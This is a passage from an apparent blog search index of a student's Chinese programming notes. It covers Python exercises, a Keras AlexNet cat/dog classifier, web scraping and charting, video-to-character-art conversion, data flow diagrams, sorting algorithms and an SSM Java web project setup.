8 = 8 2 * 8 = 16 3 * 8 = 24 4 * 8 = 32 5 * 8 = 40 6 * 8 = 48 7 * 8 = 56 8 * 8 = 64# 1 * 9 = 9 2 * 9 = 18 3 * 9 = 27 4 * 9 = 36 5 * 9 = 45 6 * 9 = 54 7 * 9 = 63 8 * 9 = 72 9 * 9 = 81# 10.# for i in range(100, 1000):# if (i // 100) ** 3 + (((i % 100 - i % 10)) / 10) ** 3 + (i % 10) ** 3 == i:# print(i)# 153# 370# 371# 407# 11.# number = int(input(&quot;请输入一个整数：&quot;))# sum = 0# n = number# while n:# left = n % 10# n = n // 10# sum +=left# print(str(number) + &quot;的各位数的和为：&quot; + str(sum))# 12.# n = int(input(&quot;请输入一个整数：&quot;))# for i in range(2, int(n ** 0.5)):# if n % i == 0:# print(n, &quot;不是质数&quot;)# else:# print(n, &quot;是质数&quot;)# n = int(input(&quot;请输入一个整数：&quot;))# if n &gt; 1:# for i in range(2, n):# if (n % i) == 0:# print(n, &#x27;不是质数&#x27;)# break# else:# print(n, &quot;是质数&quot;)# else:# print(&#x27;不是质数&#x27;)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"神经网络实现猫狗识别笔记","slug":"神经网络实现猫狗识别","date":"2020-06-20T03:13:28.000Z","updated":"2022-04-08T14:29:40.281Z","comments":true,"path":"2020/06/20/神经网络实现猫狗识别/","permalink":"http://example.com/2020/06/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%AE%9E%E7%8E%B0%E7%8C%AB%E7%8B%97%E8%AF%86%E5%88%AB/","excerpt":"神经网络实现猫狗识别","text":"神经网络实现猫狗识别 神经网络实现猫狗识别 卷积神经网络 卷积 12341. 就是一种运算，是一种矩阵降维的运算2. 为了解决卷积运算中，中心元素的运算比重远大于边缘元素的情况，补白 补白可以降低中间元素参与运算的比重。3. 步长 池化 12341. 最大池化层： 选取一个过滤器去过滤出一个区域的最大值2. 平均池化层 选取一个过滤器去过滤出一个区域的平均值 AlexNet1234567891011121314151617181920227 * 227 * 31. 卷积池化层 卷积：96个卷积核，卷积核大小11 * 11 * 3，步长为4，补白为0 池化：最大池化层，过滤器的大小是3 * 3 ，步长为22. 卷积池化层 卷积：256个卷积核，卷积核大小5 * 5 * 3，步长为1，补白为2 池化：最大池化层，过滤器大小3 * 3 ，步长为23. 卷积层 卷积：384个卷积核，卷积核大小3 * 3 * 3 ，步长为1，补白为14. 卷积层 卷积：384个卷积核，卷积核大小3 * 3 * 3，步长为1，补白为15. 卷积池化层 卷积：256个卷积核，卷积核大小3 * 3 * 3，步长为1，补白为1 池化：最大池化层，过滤器大小3 * 3，步长为26. 全连接层 4096个神经元，激活函数ReLu7. 全连接层 4096个神经元，激活函数ReLu8. 全连接层 2个神经元 Keras1Keras本身是封装了TensorFlow的一个高阶框架，支持快速实验。 123安装，如果安装了TensorFlow，在安装keras的时候可能会出错，把TensorFlow都有东西全部删除。直接pip install keras就可以了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980# @Time : 2020/6/15 8:34 # @Author : XX# @File : 猫狗识别.py # @Software: PyCharmimport osimport cv2import numpy as npfrom keras.models import Sequentialfrom keras.layers import Conv2D,MaxPool2D,Dense,Flattenfrom keras.utils import np_utilsimport keras.losses as losses# 1. 读取数据def load_datas(dir_path): # 构建特征矩阵和目标向量 datas = [] y = [] for image_name in os.listdir(dir_path): # 读取图片,构建特征矩阵 datas.append(cv2.resize(cv2.imread(os.path.join(dir_path, image_name)),(227,227))) # 构建目标向量 if image_name.split(&#x27;.&#x27;)[0]==&#x27;cat&#x27;: y.append(1) else: y.append(0) # 对y进行独热(ont-hot)编码 # y = np_utils.to_categorical(y) return np.array(datas),np.array(y)def create_model(X,Y): # 1. 构建一个序列模型(空壳) # 卷积层：filters：卷积核个数，kernel_size卷积核大小，strides步长，padding补白 # 池化层：pool_size过滤器大小，strides步长 # 全连接层Dense：units神经元个数，activation激活函数 model = Sequential() # 1. 卷积池化层 # 卷积：96个卷积核，卷积核大小11 * 11 * 3，步长为4，补白为0 model.add(Conv2D(filters=96,kernel_size=(11,11),strides=(4,4))) # 池化：最大池化层，过滤器的大小是3 * 3 ，步长为2 model.add(MaxPool2D(pool_size=(3,3),strides=(2,2))) # 2. 卷积池化层 # 卷积：256个卷积核，卷积核大小5 * 5 * 3，步长为1，补白为2 model.add(Conv2D(filters=256,kernel_size=(5,5),padding=&#x27;same&#x27;)) # 池化：最大池化层，过滤器大小3 * 3 ，步长为2 model.add(MaxPool2D(pool_size=(3,3),strides=(2,2))) # 3. 卷积层 # 卷积：384个卷积核，卷积核大小3 * 3 * 3 ，步长为1，补白为1 model.add(Conv2D(filters=384,kernel_size=(3,3))) # 4. 卷积层 # 卷积：384个卷积核，卷积核大小3 * 3 * 3，步长为1，补白为1 model.add(Conv2D(filters=384,kernel_size=(3,3))) # 5. 卷积池化层 # 卷积：256个卷积核，卷积核大小3 * 3 * 3，步长为1，补白为1 model.add(Conv2D(filters=256,kernel_size=(3,3))) # 池化：最大池化层，过滤器大小3 * 3，步长为2 model.add(MaxPool2D(pool_size=(3,3),strides=(2,2))) # 6. 全连接层 # 4096个神经元，激活函数ReLu model.add(Flatten()) model.add(Dense(units=4096,activation=&#x27;relu&#x27;)) # 7. 全连接层 # 4096个神经元，激活函数ReLu model.add(Dense(units=4096, activation=&#x27;relu&#x27;)) # 8. 全连接层 # 2个神经元,激活函数使用sigmoid或者softmax model.add(Dense(units=2, activation=&#x27;softmax&#x27;)) # 对模型进行编译 model.compile(optimizer=&#x27;adam&#x27;,loss=&#x27;sparse_categorical_crossentropy&#x27;,metrics=[&#x27;accuracy&#x27;]) model.fit(X,Y,epochs=50)if __name__ == &#x27;__main__&#x27;: # 不要用中文路径！！！！！ dir_path = r&#x27;G:\\AI\\kaggle\\train2&#x27; X,Y = load_datas(dir_path) X = X/255 create_model(X,Y)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"数据可视化分析笔记","slug":"数据可视化分析","date":"2020-06-20T03:08:50.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/06/20/数据可视化分析/","permalink":"http://example.com/2020/06/20/%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96%E5%88%86%E6%9E%90/","excerpt":"","text":"数据可视化分析12345天气预报-根据拿到的每天的天气情况来绘制可视化图表。爬虫-拿天气数据-从哪儿拿？（哪个地方没有反爬我们就去哪儿拿）S获得到数据之后，使用正则表达式筛选数据 12345678数据可视化分析，是基于数据的值进行可视化分析的一种手段，我们可以根据可视化中展示的数据，得到一些结论，比如数据是否有明显的趋势、数据的分布是否符合高斯分布(数据的一个体现)数据的平稳性(数据分析首先对数据进行平稳性分析) 如果是平稳性数据需要分析的时候需要采用： AR MA ARMA 如果是非平稳性数据分析需要采用： ARIMA 项目要求采集数据，并且合理的将数据生成HTML进行数据可视化展示。要求组内每个人都需要至少生成三张图表不限制一定要天气数据。 123456789101112131415161718192021222324252627282930313233343536373839404142434445# _*_coding:UTF-8 _*_# 推荐安装pyecharts1.6.0# pip install pyecharts==1.6.0# 如果使用pycharm安装，settings中project中 project interpreter点击，# 点击右方加号，搜索pyecharts点击install即可。# 如果要指定版本，勾选右下方specify version，选择1.6.0# 然后在点击install package# 如果安装成功后，发现版本不对，卸载重装# 卸载:pip uninstall pyechartsimport requestsimport re #正则表达式import jsonfrom pyecharts.charts import Barfrom pyecharts import options as optsurl1 = &#x27;http://www.weather.com.cn/weather1d/101010100.shtml&#x27;# 北京url2 = &#x27;http://www.weather.com.cn/weather1d/101020100.shtml&#x27;# 上海url3 = &#x27;http://www.weather.com.cn/weather1d/101100101.shtml&#x27;# 太原def get_data(url): res = requests.get(url=url) text = res.content.decode(&#x27;utf-8&#x27;) # print(text) r1 = re.findall(&#x27;hour3data=(.*?&#125;)&#x27;, text) r2 = r1[0] # 使用json把字符串转为字典 r3 = json.loads(r2) today = r3[&#x27;7d&#x27;][0] return todaytoday1 = get_data(url1)# 北京温度today2 = get_data(url2)# 上海温度today3 = get_data(url3)# 太原温度# print([i.split(&#x27;,&#x27;)[3] for i in today1])c = (Bar() .add_xaxis([i.split(&#x27;,&#x27;)[0] for i in today1]) .add_yaxis(&#x27;北京温度&#x27;,[int(i.split(&#x27;,&#x27;)[3].strip(&#x27;℃&#x27;)) for i in today1])# 北京 .add_yaxis(&#x27;上海温度&#x27;,[int(i.split(&#x27;,&#x27;)[3].strip(&#x27;℃&#x27;)) for i in today2])# 上海 .add_yaxis(&#x27;太原温度&#x27;,[int(i.split(&#x27;,&#x27;)[3].strip(&#x27;℃&#x27;)) for i in today3])# 太原 .set_global_opts(title_opts=opts.TitleOpts(title=&#x27;各城市当天温度&#x27;), toolbox_opts=opts.TitleOpts) )c.render(&#x27;1.html&#x27;)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"线性回归和逻辑回归学习笔记","slug":"线性回归和逻辑回归学习笔记","date":"2020-06-16T14:42:40.000Z","updated":"2022-04-08T14:29:40.281Z","comments":true,"path":"2020/06/16/线性回归和逻辑回归学习笔记/","permalink":"http://example.com/2020/06/16/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E5%92%8C%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"python 机器学习 机器学习利用大量的数据样本，使得计算机通过不断的学习获得一个模型，用来对新的未知数据做预测","text":"python 机器学习 机器学习利用大量的数据样本，使得计算机通过不断的学习获得一个模型，用来对新的未知数据做预测 12机器学习利用大量的数据样本，使得计算机通过不断的学习获得一个模型，用来对新的未知数据做预测 机器学习有监督学习（分类、回归）同时将数据样本和标签输入给模型，模型学习到数据和标签的映射关系，从而对新数据进行预测 无监督学习（聚类）只有数据，没有标签，模型通过总结规律，从数据中挖掘出信息。 强化学习强化学习会在没有任何标签的情况下，通过先尝试做出一些行为得到一个结果，通过这个结果是对还是错的反馈，调整之前的行为，就这样不断的调整，算法能够学习到在什么样的情况下选择什么样的行为可以得到最好的结果 线性回归1利用大量的样本，通过有监督的学习，学习到由x到y的映射f ff，利用该映射关系对未知的数据进行预估，因为y为连续值，所以是回归问题。 逻辑回归123456789监督学习，解决二分类问题。监督学习，解决二分类问题。分类的本质：在空间中找到一个决策边界来完成分类的决策逻辑回归：线性回归可以预测连续值，但是不能解决分类问题，我们需要根据预测的结果判定其属于正类还是负类。","categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"Python字符串视频的生成笔记","slug":"Python字符串视频的生成","date":"2020-06-11T13:18:32.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/06/11/Python字符串视频的生成/","permalink":"http://example.com/2020/06/11/Python%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%86%E9%A2%91%E7%9A%84%E7%94%9F%E6%88%90/","excerpt":"给一个完整的视频，对视频进行处理，达到：生成一个新的视频，用自己想要的字符串来代替视频中的原有元素。","text":"给一个完整的视频，对视频进行处理，达到：生成一个新的视频，用自己想要的字符串来代替视频中的原有元素。 字符串视频的生成1给一个完整的视频，对视频进行处理，达到：生成一个新的视频，用自己想要的字符串来代替视频中的原有元素。 思路123451. open-cv视频处理库 pip install opencv-python2. 先把视频里面每一帧的图片都抽取出来3. 把每一帧的图片都给处理成字符串组成的新图片4. 新的图片给组合成一个新的视频。 读取视频12345678910111213141516171819202122232425262728# _*_coding:UTF-8 _*_&#x27;&#x27;&#x27;1. open-cv视频处理库 pip install opencv-python2. 先把视频里面每一帧的图片都抽取出来3. 把每一帧的图片都给处理成字符串组成的新图片4. 新的图片给组合成一个新的视频。&#x27;&#x27;&#x27;# CV2不支持中文，任何中文路径都会报错import cv2# 打开一个视频流,方法中需要传一个参数，默认无参，表示打开摄像头。vidcap = cv2.VideoCapture(r&#x27;G:\\CV\\video\\video.avi&#x27;)# print(vidcap.read()) # .read()方法返回两个值：1.读取状态2. 视频里图片的元素 三通道图片RGBsuccess = True# count为计数器，主要为了对图片进行排序count = 0while success: # 读取视频的内容，返回读取状态和当前帧内容（当前帧是一个三通道的图片） success,image = vidcap.read() # print(success) 程序终止 # 把当前帧图片写入到文件夹中 cv2.imwrite(r&#x27;G:\\CV\\pic\\%d.jpg&#x27;%count,image) #记录顺序，并命名%d.jpg count += 1# 一定会报错，会在最后一次，读取最后一帧，超过最后一帧的时候，会报错。 处理视频图片为字符串图片1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# _*_coding:UTF-8 _*_from PIL import Image,ImageDraw,ImageFontimport osimport cv2&#x27;&#x27;&#x27;Cpython基于C编写，GIL锁，目的是为了防止脏读脏读：无效数据的读出，是指在数据库访问中，事务T1将某一值修改，然后事务T2读取该值，此后T1因为某种原因撤销对该值的修改，这就导致了T2所读取到的数据是无效的，值得注意的是，脏读一般是针对于update操作的。&#x27;&#x27;&#x27;def draw(pic): # 读取在上一个程序中保存下来的截图 # 有时候PIL和CV2他不支持反斜杠，需要将反斜杠换为斜杠 # 现在读出来的图片，虽然是三通道，但不是RGB，而是BGR img = cv2.imread(&#x27;G:\\CV\\strVideo\\pic\\%s&#x27;%pic) # print(img) # 把读出来的数据BGR换为RGB # 读出来的每一张图片都是三维数据，[图片长，图片宽，通道值] img = img[:,:,(2,1,0)] #切第三维，原本为BGR（0，1，2），需改为RGB（2，1，0） # print(img) # 创建一个新的空白画布,如果最后color值不传或者为None则默认为黑色填充 blank = Image.new(&quot;RGB&quot;,[len(img[0]),len(img)],&quot;white&quot;) # 创建一个新画布，可以在给定图像上进行绘图,需要给定要在哪个图像上进行绘图 drawOBJ = ImageDraw.Draw(blank) n = 10 # 规定要使用的字体,并且规范字号 font = ImageFont.truetype(r&#x27;C:\\Windows\\Fonts\\Microsoft YaHei UI\\msyhbd.ttc&#x27;,size=n-1) # 需要遍历新图像的每个像素点 for i in range(0,len(img),n): #注意步长n for j in range(0,len(img[i]),n): text = &#x27;人智真棒&#x27; #重新替换所有元素 drawOBJ.ink = img[i][j][0]+img[i][j][1] * 256 + img[i][j][2]*256*256 drawOBJ.text([j,i],text[int(j/n) % len(text)],font=font) # 保存图片，第一个参数为路径，第二个参数为保存格式 print(i,j) # 保存图片，第一个为路径，第二个为保存格式 blank.save(&#x27;new/new_&#x27;+pic,&#x27;jpeg&#x27;)# 获取到传入路径下的所有文件名filelist = os.listdir(r&#x27;G:\\CV\\strVideo\\pic&#x27;)for file in filelist: draw(file)# print(filelist) 将新图片组成新的视频1234567891011121314151617181920212223242526272829303132333435363738394041424344# _*_coding:UTF-8 _*_import osimport cv2# 排序def resort(list): for i in range(len(list)-1): #len(list)-1后面取不到 for j in range(len(list)-1): # print(list[j+1].split(&#x27;.&#x27;)[0].split(&#x27;_&#x27;)[1]) 先用&quot;.&quot;分，生成列表new_0，在用&quot;_&quot;分 # 冒泡排序 这里需要注意转成整型在比较，原来为字符串 # 字符串比较的时候是按位数比较 if int(list[j].split(&#x27;.&#x27;)[0].split(&#x27;_&#x27;)[1]) &gt; int(list[j+1].split(&#x27;.&#x27;)[0].split(&#x27;_&#x27;)[1]): list[j],list[j+1] = list[j+1],list[j] return listfilelist = os.listdir(r&#x27;G:\\CV\\strVideo\\new&#x27;)filelist = resort(filelist)# fps=频率，指的是每秒钟显示多少张照片fps = 24# 图片的分辨率 高 × 宽# 规定导出的文件名file_path = r&#x27;G:\\CV\\strVideo\\video\\new_video.avi&#x27;# 规定导出的格式fourcc = cv2.VideoWriter_fourcc(&#x27;I&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;0&#x27;)# 规定视频流编码# 不同视频编码对应不同视频格式（例：&#x27;I&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;0&#x27; 对应avi格式）# fourcc = cv2.VideoWriter_fourcc(&#x27;D&#x27;, &#x27;I&#x27;, &#x27;V&#x27;, &#x27;X&#x27;) #mp4格式# 创建写入视频对象，需要规范输出文件路径、编码格式、fps以及图片分辨率# 相当于创建一个视频，但是该视频为空# video = cv2.VideoWriter(file_path,fourcc,fps,size) size是相反的video = cv2.VideoWriter(file_path,fourcc,fps,(960,540)) #需要特别注意分辨率问题# 遍历图片往视频里面写for item in filelist: item = os.path.join(r&#x27;G:\\CV\\strVideo\\new&#x27;, item) #文件名和图片名拼接一起 # print(item) 显示拼接后的路径 # 读取图片内容 img = cv2.imread(item) print(img) # 相当于向视频中一帧一帧的添加图片 video.write(img)video.release() #释放video资源","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"软件需求工程---数据流图","slug":"软件需求工程-数据流图","date":"2020-06-09T07:28:28.000Z","updated":"2022-04-08T14:29:40.281Z","comments":true,"path":"2020/06/09/软件需求工程-数据流图/","permalink":"http://example.com/2020/06/09/%E8%BD%AF%E4%BB%B6%E9%9C%80%E6%B1%82%E5%B7%A5%E7%A8%8B-%E6%95%B0%E6%8D%AE%E6%B5%81%E5%9B%BE/","excerpt":"软件需求工程—数据流图","text":"软件需求工程—数据流图 软件需求工程—数据流图1234567891011121314151617数据流图**是过程建模所使用的主要建模技术，它在建模时所使用的基本模型元素有4种：**外部实体、过程、数据流和数据存储**。最终建立的数据流图会以图形的方式表现出来，它的表示法有两种：**DeMarco-Yourdon**表示法和**Gane-Sarson**表示在DeMarco-Yourdon表示法，外部实体使用**矩形**来加以描述，在Gane-Sarson表示法中，外部实体使用**双矩形**或矩形来加以描述。**过程**是指施加与数据的动作或行为，它们使数据发生变化，包括被转换、被存储或被分布。数据流是数据的运动，它是系统与其环境之间或者系统内两个过程之间的通信形式。**外部实体**是指处于待构建系统之外的人、组织、设备或其他软件系统，他们不受系统的控制，开发者不能以任何方式操纵人们。在数据流图中需要进行建模的外部实体是那些和待构建的软件系统之间存在着数据交互的外部实体，它们从待构建软件系统中获取数据或者为待构建软件系统提供数据，即它们是待构建系统的数据源或数据目的地。所有的外部实体联合起来构成了软件系统的外部上下文环境，它们与软件系统的交互流就是软件系统与其外部环境的接口，这些接口联合起来定义了软件系统的系统边界。对软件系统功能分析就是从系统的边界出发逐步深入的。**数据流**是数据的运动，它是系统与其环境之间或者系统内两个过程之间的通信形式。数据流图的数据流是必须和过程产生关联的，它要么是过程的数据输入，要么是过程的数据输出。**数据存储**是软件系统需要在内部收集、保存，以供日后使用的数据集合。如果说数据流描述的是运动的数据，那么数据存储描述的就是静止的数据。数据流图使用外部实体、过程、数据流和数据存储这4个元素来构建系统的过程模型，描述系统的功能、行为和数据。 过程是对数据的处理，必须是有输入，也必须有输出； 数据流是必须和过程产生关联的，它要么是过程的数据输入，要么是过程的数据输出。 数据流图中所有的对象都应该有一个可以唯一标示自己的名称。 在分层结构中定义了3个层次的数据流图：上下文图、0层图和N层图。数据流图层次结构的建立主要包括以下几个步骤：1创建上下文图2发现并建立DFC片段3根据数据流图片段组合产生0层图4对0层图的过程进行功能分解，产生N层图。以上步骤往往需要不断的反复。","categories":[],"tags":[{"name":"需求工程","slug":"需求工程","permalink":"http://example.com/tags/%E9%9C%80%E6%B1%82%E5%B7%A5%E7%A8%8B/"}]},{"title":"爬虫学习笔记","slug":"爬虫学习笔记","date":"2020-06-09T07:07:53.000Z","updated":"2022-04-08T14:29:40.281Z","comments":true,"path":"2020/06/09/爬虫学习笔记/","permalink":"http://example.com/2020/06/09/%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"爬虫学习笔记请求与响应","text":"爬虫学习笔记请求与响应 爬虫学习笔记请求与响应爬虫：crawler、网络机器人、网络蚂蚁、网络蜘蛛、spider 1. 通用爬虫 主要用于搜索引擎，谷歌、百度、360、搜狗、必应等等..... 目的在于尽可能多的搜集互联网上的高质量数据 优点：数量大且全 缺点：有价值的数据比较少，硬件成本太高。pagerank 2. 聚焦爬虫： 也成为主题爬虫（最常用的爬虫） 要按照预先设定好的主题，有选择性的进行网页爬取。 主要用于特定信息的获取。 优点：节省资源，数据价值较高。 3. 增量式爬虫 是一种特殊的聚焦爬虫，只采集更新后的数据 每次爬取只爬取更新后的页面（一天、一周、一月） 123456789101112 2. ## 协定约束 在首页/IP后面加上/robots.txt可以看到君子协定。3. ## 库 ```markdown 1. urllib 最基础的，python自带的一个http请求库 2. requests 基于urllib进行了封装，是一个第三方库 pip install requests 3. scrapy 协程级的异步框架4. scrapy-redis 基于scrapy和redis出现的分布式爬虫框架 5. aiohttp...... HTTP的主要请求 1234561. GET请求：向服务器请求资源 get请求可以携带参数，参数携带方式以在url后面以问号拼接的形式携带2. POST请求：向服务器请求资源 1. post请求可以携带参数，通过表单提交，post的请求的参数一般是加密的。3. PUT请求：请求服务器存储一个资源4. DELETE请求：请求服务器删除一个资源。 爬虫程序思路 1. 发送get请求 res = requests.get() res.text 如果出现乱码，查找网页中的网页编码方式，进行解码在编码 res.content.decode() 2. 如何解析响应 1. 正则 2. BS 3. lxml 第三方类库，效率快，可以解析html和xml pip install lxml pip install -i https://pypi.tuna.tsinghua.edu.cn/simple lxml 如何更新pip pip install --upgrade pip 可以使用xpath语法来获取数据 1. 基本语法： //:从根目录开始获取 @属性名：获取属性值 /表示从当前对象开始获取 []：筛选元素 2. 内置函数 text() 12345678910111213141516171819202122232425262728### 案例```pythonimport requestsfrom lxml import etreeurl = &#x27;http://www.xbiquge.la/xiaoshuodaquan/&#x27;res = requests.get(url=url)ele = etree.HTML(res.text)bookurl = ele.xpath(&quot;//div[@class=&#x27;novellist&#x27;]/ul/li/a/@href&quot;)for url in bookurl: res = requests.get(url=url) txt = res.content.decode(&#x27;utf-8&#x27;) ele = etree.HTML(txt) content_url = ele.xpath(&quot;//div[@id=&#x27;list&#x27;]/dl/dd/a/@href&quot;) for u in content_url: res = requests.get(url = &#x27;http://www.xbiquge.la&#x27;+u) # pycharm的输出有长度限制，实际上正文已经获取到了，但是pycharm不显示 content = res.content.decode(&#x27;utf-8&#x27;) ele = etree.HTML(content) c = ele.xpath(&quot;//div[@id=&#x27;content&#x27;]/text()&quot;) print(c) s = &#x27;&#x27; for cc in c: s+= cc s = s.strip() with open(&#x27;牧神记.txt&#x27;,&#x27;a+&#x27;,encoding=&#x27;utf-8&#x27;) as w: w.write(s+&#x27;\\n&#x27;+&#x27;\\n&#x27;+&#x27;\\n&#x27;)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"python 实现冒泡排序和选择排序","slug":"python 实现冒泡排序和选择排序","date":"2020-06-08T09:45:53.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/06/08/python 实现冒泡排序和选择排序/","permalink":"http://example.com/2020/06/08/python%20%E5%AE%9E%E7%8E%B0%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E5%92%8C%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/","excerpt":"python 实现冒泡排序,选择排序,插入排序","text":"python 实现冒泡排序,选择排序,插入排序 python 实现冒泡排序和选择排序冒泡排序： 比较相邻的元素。如果第一个比第二个大，就交换他们两个。 对每一对相邻元素做同样的工作，从开始第一对到结尾的最后一对。在这一点，最后的元素应该会是最大的数。 针对所有的元素重复以上的步骤，除了最后一个。 持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。 1234567891011121314151617181920212223import randoma = []for i in range(10): a.append(random.randint(0, 100))print(&#x27;排序前：&#x27;, a)# 从小到大for i in range(len(a)-1): for j in range(len(a) - 1 - i): if a[j] &gt; a[j + 1]: a[j], a[j + 1] = a[j + 1], a[j]print(&#x27;排序后：&#x27;, a)# 从大到小for i in range(len(a)-1): for j in range(len(a) - 1 - i): if a[j] &lt; a[j + 1]: a[j], a[j + 1] = a[j + 1], a[j]print(&#x27;排序后：&#x27;, a) 选择排序：对比数组中前一个元素跟后一个元素的大小，如果后面的元素比前面的元素小则用一个变量k来记住他的位置，接着第二次比较，前面“后一个元素”现变成了“前一个元素”，继续跟他的“后一个元素”进行比较如果后面的元素比他要小则用变量k记住它在数组中的位置(下标)，等到循环结束的时候，我们应该找到了最小的那个数的下标了，然后进行判断，如果这个元素的下标不是第一个元素的下标，就让第一个元素跟他交换一下值，这样就找到整个数组中最小的数了。然后找到数组中第二小的数，让他跟数组中第二个元素交换一下值，以此类推。 1234567891011121314151617import randoma = []for i in range(10): a.append(random.randint(0, 100))print(&#x27;排序前：&#x27;, a)for i in range(len(a)): # 找一个最小值的下标 min = i for j in range(i+1,len(a)): if a[min] &gt; a[j]: min = j a[min], a[i] = a[i], a[min]print(&#x27;排序后：&#x27;,a) 插入排序 思想：现在已经有一个有序的序列了，要求在这个已经的数据序列中，再插入一个数 插入排序是将序列分为两部分，最开始的时候第一个数就是一个有序部分，剩下的部分为无序部分，每次取无序部分中的第一个数和无序部分进行比较，放入到有序部分中的合适的位置 [65,27,59,64,58] [65] [27,59,64,58] [65] [27,59,64,58] -&gt; [27,65] [59,64,58] -&gt; [27,65] [64,58] 12345678910111213141516171819import randoma = []for i in range(10): a.append(random.randint(0, 100))print(&#x27;排序前：&#x27;, a)# 取无序部分的第一个元素，和有序部分进行比较，放在合适的位置# [65,27,59,64,58]# [20,27,59,65,65,,20]for i in range(len(a) - 1): for j in range(i + 1, 0, -1): if a[j] &lt; a[j - 1]: a[j], a[j - 1] = a[j - 1], a[j] else: breakprint(&#x27;排序后：&#x27;, a)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"SSM框架web系统思路","slug":"SSM框架web系统","date":"2020-05-22T09:45:53.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/05/22/SSM框架web系统/","permalink":"http://example.com/2020/05/22/SSM%E6%A1%86%E6%9E%B6web%E7%B3%BB%E7%BB%9F/","excerpt":"系统架构设计","text":"系统架构设计 SSM框架web系统思路 系统架构设计1.持久对象层(也称持久层或持久化层):该层由若干持久化类(实体类)组成 2.数据访问层( DAO 层):该层由若干 DAO 接口和 MyBatis 映射文件组成 接口的名称统一以 Dao 结尾，且 MyBatis 的映射文件名称要与接口的名称相同 3.业务逻辑层( Service 层):该层由若干 Service 接口和实现类组成 在本系统中，业务逻辑层的接口统一使用 Service 结尾，其实现类名称统一在接口名后加 Impl 该层主要用于实现系统的业务逻辑 4.Web 表现层:该层主要包括 Spring MVC 中的 Controller 类和 JSP 页面 Controller 类主要负责拦截用户请求，并调用业务逻辑层中相应组件的业务逻辑方法来处理用户请求，然后将相应的结果返回给 JSP 页面. 下面通过一张图来描述各个层次的关系和作用，如图所示 文件组织结构 数据库设计123456789101112131415161718192021222324mysql -uroot -p123show database;show variables like &quot;%char%&quot;; //查看编码格式create database db_zfy ;use db_zfy ;desc students; //查看表结构drop table tb_person; //删除表delete from tb_person where id=4; //删除表内容create table tb_product(id int (32) primary key auto_increment,name varchar(32),price double);insert into tb_product values(&#x27;1&#x27;,&#x27;java基础入门&#x27;,&#x27;44.5&#x27;);alter table tb_person convert to character set utf8; // 修改表的字符编码集 系统环境搭建JAR包 1.Spring框架所需的10个 • aopalliance-1.0.jar• aspectjweaver -1.8.1 O.jar• spring-aop-4.3.6.RELEASE.jar• spring-aspects-4.3.6.RELEASE.jar• spring-beans-4.3.6.RELEASE.jar• spring-context-4.3.6.RELEASE.jar • spring-core-4 .3.6.RELEASE.jar • spring-expression-4 . 3 . 6 .RELEASE.jar • spring-:-jdbc-4.3 .6.RELEASE.jar • spring-tx-4 . 3 .6.RELEASE .jar Spring MVC 框架所需要的 JAR (2 个) • spring-web-4.3 . 6 .RELEASE.jar • spring-webmvc-4 .3.6 .RELEASE .jar MyBatis 框架所需的 JAR (13 个) ​ 主要包括核心包 mybatis-3 .4 2.jar ，以及其解压文件夹中 lib 目录下的所有 JAR • ant-1 . 9 . 6 .jar • ant-launcher-1.9.6 .jar • asm-5 . 1 .jar • cglib-3 . 2.4 .jar • commons-logging-1.2 .jar . • javassist-3 .21 .0-GA.jar • log4j-1.2.17 .jar • log4j-api-2 .3.jar • log4j-core-2 . 3 .jar • mybatis-3.4.2 .jar • ognl-3 . 1 .12.jar • slf4j-api-1 . 7 .22 .jar • slf4j-log4j12-1 . 7 .22 .jar MyBatis —Spring 整舍的中间 JAR (1 个) • mybatis-spring-1 . 3 . 1 .jar 数据库驱动 JAR 包( 个) • mysql-connector-java-5 . 1.40-bin .jar 数据源 dbcp 所需 JAR (2 个) • commons-dbcp2-2 . 1 . 1 .jar • commons-pooI2-2.4 . 2 .jar JSTL 标签库 JAR (2 个) • taglibs-standard-impl-1.2.5 .jar • taglibs-standard-spec-1 .2.5.jar Jackson 框架所需 JAR (3 个) • ja ckson-annotations-2.8 . 6 .jar • jack son-core - 2.8 . 6 .jar • jackson-databind-2 .8.6 .jar Java 工具类 JAR (1 个) • common s-lang3-3.4 .jar 持久化类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475package cn.zfy.eft.exp3.ssm.po;public class Students &#123; private Integer id; //主键id private String name; private Integer age; private String gender; private String number; private String address; private Integer status;//激活状态 public Integer getId() &#123; return id; &#125; public void setId(Integer id) &#123; this.id = id; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public Integer getAge() &#123; return age; &#125; public void setAge(Integer age) &#123; this.age = age; &#125; public String getGender() &#123; return gender; &#125; public void setGender(String gender) &#123; this.gender = gender; &#125; public String getNumber() &#123; return number; &#125; public void setNumber(String number) &#123; this.number = number; &#125; public String 